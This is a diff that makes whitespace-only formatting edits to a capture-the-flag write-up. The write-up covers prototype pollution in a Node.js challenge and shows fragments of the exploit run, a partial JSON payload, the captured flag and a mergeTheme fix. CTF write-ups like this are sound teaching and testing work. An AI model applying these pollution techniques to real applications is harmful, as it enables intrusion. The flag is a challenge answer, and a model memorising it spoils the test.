@@ -49,6 +49,7 @@ do-you-know-lika/
 │   └── local_test.js         # Local reproduction
 └── assets/
     └── response.json         # Captured API response
+
 ```
 
 ---
@@ -69,6 +70,7 @@ do-you-know-lika/
 if (key === "__proto__") {
   return true;
 }
+
 ```
 
 ### 2. Vulnerability Chain Discovery
@@ -94,11 +96,14 @@ echo "FortID{test_flag}" > /tmp/lika/flag.txt
 
 # Run exploit
 node exploit/local_test.js
+
 ```
 
 **Output:**
+
 ```
 THREW message: FortID{test_flag}
+
 ```
 
 ---
@@ -121,20 +126,24 @@ THREW message: FortID{test_flag}
   },
   "model": { "title": "hi", "message": "hi" }
 }
+
 ```
 
 ### Remote Execution
 
 ```bash
 python3 exploit/solve.py
+
 ```
 
 **Response:**
+
 ```json
 {
   "ok": false,
   "error": "FortID{L1K4_41R_1S_50_FR35H_Y0U_C4N_T45T3_TH3_P0LLUT10N_162ee9433e}\n"
 }
+
 ```
 
 ---
@@ -143,6 +152,7 @@ python3 exploit/solve.py
 
 ```
 FortID{L1K4_41R_1S_50_FR35H_Y0U_C4N_T45T3_TH3_P0LLUT10N_162ee9433e}
+
 ```
 
 Verified via:
@@ -169,6 +179,7 @@ function mergeTheme(target, source) {
     // ... rest unchanged
   }
 }
+
 ```
 
 ---
